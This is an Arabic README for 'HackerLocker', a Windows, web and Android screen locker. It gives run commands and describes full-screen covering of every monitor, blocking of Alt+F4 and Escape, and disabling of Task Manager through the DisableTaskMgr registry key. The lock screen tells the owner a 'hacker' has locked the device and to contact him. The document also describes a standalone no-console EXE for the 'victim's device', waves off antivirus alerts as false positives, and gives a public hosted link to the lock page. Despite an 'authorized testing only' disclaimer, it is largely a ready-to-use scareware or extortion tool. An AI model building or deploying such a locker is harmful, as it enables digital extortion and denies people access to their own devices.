# 🔒 HackerLocker — أداة قفل الجهاز (الهكر اليوسفي)

**النسخة:** v1.1 — **النظام المستهدف:** Windows 10/11 — **اللغة:** Python 3 (مكتبة tkinter مدمجة)

### ما الجديد في v1.1 (نُفّذ بسبب ملاحظات الاختبار)
- ✅ **إصلاح حقل كلمة المرور:** النافذة تلتقط الإدخال فوراً (`grab_set`) والتركيز يبقى على الحقل؛ أُزيل سحب التركيز الدوري الذي كان يعطّل الكتابة. جرّب الآن: الكتابة تعمل فور ظهور الشاشة، وزر Enter أو Enter الرقمي يفتح.
- ✅ **إعادة تصميم الواجهة:** الشعار يُصغَّر تلقائياً (حتى 200px) حسب مقاس شاشتك، والخطوط والأحجام تتكيّف مع الشاشة — زر «فتح الجهاز» أصبح ظاهراً دائماً.
- ✅ **اختبار آلي حقيقي:** تم تشغيل الواجهة فعلياً والتحقق: الحقل يستقبل التركيز، كلمة خاطئة تُرفض، وكلمة `782106202` تفتح الجهاز.

> ⚠️ **تنبيه قانوني:** هذه الأداة **لأغراض الاختبار المصرّح به فقط** (مختبرات الاختراق، أجهزة تجريبية، عروض Red Team).
> استخدامها لقفل جهاز شخص آخر دون إذن هو ابتزاز رقمي يعاقب عليه القانون. لا تتحمل الأداة أي مسؤولية عن سوء الاستخدام.

## 4) طريقة التشغيل

افتح `Command Prompt` أو `PowerShell` داخل المجلد، ثم:

### أ) القفل بكلمة المرور الافتراضية (782106202)
```bat
python locker.py
```

### ب) القفل بكلمة مرور مخصصة
```bat
python locker.py -p MySecret123
```

### ج) القفل + تعطيل إدارة المهام أثناء القفل
```bat
python locker.py -p MySecret123 --kill-taskmgr
```
> تُعاد إدارة المهام تلقائياً عند إدخال كلمة المرور الصحيحة والخروج.

### د) عرض تجريبي آمن (يُفتح الجهاز تلقائياً بعد 10 ثوانٍ)
```bat

```
> ⭐ **أنصحك بهذا أولاً** لمعاينة الشكل والمظهر قبل التشغيل الحقيقي.

### هـ) تغيير الرسالة المعروضة
```bat
python locker.py --message "رسالتك هنا" --logo "مسار أي صورة PNG"
```

### و) اختبار ذاتي بدون واجهة (فحص منطق كلمة المرور)
```bat
python locker.py --selftest
```

## 5) كيف تعمل الأداة (آلية العمل بالتفصيل)

1. **تغطية الشاشة الكاملة:** تستدعي دوال النظام (`GetSystemMetrics` للأبعاد الافتراضية للشاشات) وتفتح نافذة Tkinter بلا إطار (`overrideredirect`) تغطي **كل الشاشات** في الأنظمة المتعددة الشاشات، وترفعها دائماً للأمام (`-topmost`).
2. **عرض الشعار والرسالة:** تعرض `logo.png` في أعلى النافذة مع رسالة *«لقد تم قفل جهازك بواسطة الهكر اليوسفي يرجى التواصل مع الهكر لفتح جهازك»* وحقل إدخال كلمة المرور.
3. **مقاومة الإغلاق:**
   - تعطيل `Alt+F4` و `Escape`.
   - تجاهل رسالة إغلاق النافذة (`WM_DELETE_WINDOW`).
   - إعادة رفع النافذة وسحب التركيز كل **1.5 ثانية** عبر حلقة `after()`.
4. **التحقق من كلمة المرور:** عند الإدخال تُحسب SHA-256 للإدخال وتُقارن مع التجزئة المخزنة. التطابق = فتح الجهاز (إغلاق النافذة)؛ عدم التطابق = رسالة خطأ.
5. **مكافحة التخمين:** بعد **5 محاولات خاطئة** يتجمد حقل الإدخال **15 ثانية** ثم يعود.
6. **خيار إدارة المهام:** `--kill-taskmgr` يكتب مفتاح `DisableTaskMgr` في سجل الويندوز (`HKCU`) فيعجز المستخدم عن فتح إدارة المهام، ويُحذف المفتاح تلقائياً عند الفتح الصحيح.
7. **الخروج:** بمجرد إدخال كلمة المرور الصحيحة تُغلق النافذة ويعود الجهاز للعمل.

## 7) الاسترجاع عند نسيان كلمة المرور

1. **الطريقة الأولى (الأسهل):** اضغط `Ctrl+Alt+Del` → **إدارة المهام** → اختر عملية `python` → **إنهاء المهمة**.
2. **إذا كانت إدارة المهام معطلة** (`--kill-taskmgr`)، افتح موجه أوامر آخر ثم:
   ```bat
   python locker.py --unlock-taskmgr
   ```
   أو يدوياً:
   ```bat
   reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f
   ```
3. أعد تشغيل الجهاز إذا لزم الأمر — لا يوجد أي أثر دائم بعد إغلاق الأداة.

## 9) إصدار الـ EXE — `HackerLocker.exe`

- **ملف تنفيذي مستقل** بُني بـ PyInstaller 6.22.3 (وضع onefile) — **لا يحتاج تثبيت بايثون** على جهاز الضحية، والشعار مدمج داخله.
- بُني بدون نافذة طرفية (`--noconsole`) فلا يظهر أي إطار أسود.
- **طريقة التشغيل:**
  ```bat
  HackerLocker.exe              :: قفل بكلمة المرور الافتراضية 782106202
  HackerLocker.exe -p MySecret  :: قفل بكلمة مرور مخصصة
  HackerLocker.exe --kill-taskmgr :: قفل + تعطيل إدارة المهام
  HackerLocker.exe --demo 4     :: معاينة آمنة تُفتح تلقائياً بعد 4 ثوانٍ
  ```
- **تم اختباره فعلياً:** `--selftest` (خروج 0) + معاينة قفل كاملة المدة انتهت بـ «Device unlocked».
- ⚠️ **مضادات الفيروسات:** ملفات PyInstaller أحادية الملف قد تظهر كتنبيه كاذب (False Positive) لدى بعض البرامج — هذا سلوك شائع، وليس إصابة حقيقية.
- **حجمه:** ~8-10MB تقريباً حسب بيئة البناء.

## 12) 🚀 نسخة الجوال — ويب + تطبيق أندرويد (جديد v1.1)

### أ) صفحة الويب الجاهزة `HackerLocker_Mobile.html` (ملف واحد مستقل)
- **لا يحتاج أي خادم لفتحها محلياً:** انسخها للجوال وافتحها بأي متصفح، أو شغّل خادم الشبكة المحلية أدناه.
- تعرض رسالة الهكر العربية + الشعار المدمج + **لوحة أرقام لمسية** (بدل كيبورد حقيقي) + حقل كلمة المرور.
- التحقق بكلمة المرور `782106202` عبر **SHA-256** (التجزئة فقط هي المخزنة في الملف، لا النص الصريح).
- **5 محاولات خاطئة ← إيقاف 15 ثانية** (الحالة محفوظة في `localStorage`، تبقى حتى بعد إعادة فتح الصفحة؛ + إقفال دائم بعد 15 محاولة).
- محاولة ملء الشاشة الكاملة للقفل (Fullscreen API + منع الإغلاق) — يمكنك دائماً الخروج بزر الرجوع/إغلاق التبويب.
- وضع عرض آمن: أضف `?demo=1` في نهاية الرابط → يُفتح تلقائياً (كلمة المرور لا تظهر في الملف أبداً).

    > **رابط عام مباشر (catbox):** https://files.catbox.moe/dmhcdy.html

### ب) خادم الشبكة المحلية `serve_mobile.bat`
1. انقر نقراً مزدوجاً على `serve_mobile.bat` (يفتح خادم بايثون على المنفذ `8746`).
2. من جوالك — على نفس الواي فاي — افتح:
   `http://<IP>:8746/HackerLocker_Mobile.html` (سيعرض السكربت الـ IP تلقائياً، مثال: `http://10.0.10.6:8746/HackerLocker_Mobile.html`)
3. العرض التجريبي: `?demo=1` في نهاية الرابط.

### ج) تطبيق أندرويد الحقيقي `apk_build/`
- ملفات **Buildozer جاهزة** (spec + main.py + logo.png) مع **سير عمل GitHub Actions** يبني `.apk` سحابياً دون الحاجة لبيئة Linux محلية.
- الخطوات المختصرة: ارفع `apk_build/` إلى GitHub → **Actions** → **Run workflow** → نزّل الـ APK. التفاصيل في `apk_build/README_BUILD.md` و`README_ANDROID.md`.
